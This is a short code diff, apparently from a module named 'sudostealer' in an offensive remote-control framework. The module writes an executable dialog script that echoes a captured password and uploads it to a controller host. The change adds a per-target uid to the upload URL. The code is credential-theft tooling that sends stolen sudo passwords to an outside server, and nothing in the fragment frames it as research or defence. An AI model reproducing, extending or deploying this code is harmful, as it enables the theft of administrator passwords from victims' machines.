@@ -24,7 +24,7 @@ echo "$password"
 					f.write(append)
 	
 	with open(dialogpath, 'w') as f:
-		f.write(DIALOG.format(f"http://{current_host}/machines/modules/sudostealer/upload"))
+		f.write(DIALOG.format(f"http://{current_host}/machines/modules/sudostealer/upload/{state['uid']}"))
 	st = os.stat(dialogpath)
 	os.chmod(dialogpath, st.st_mode | stat.S_IEXEC)
 
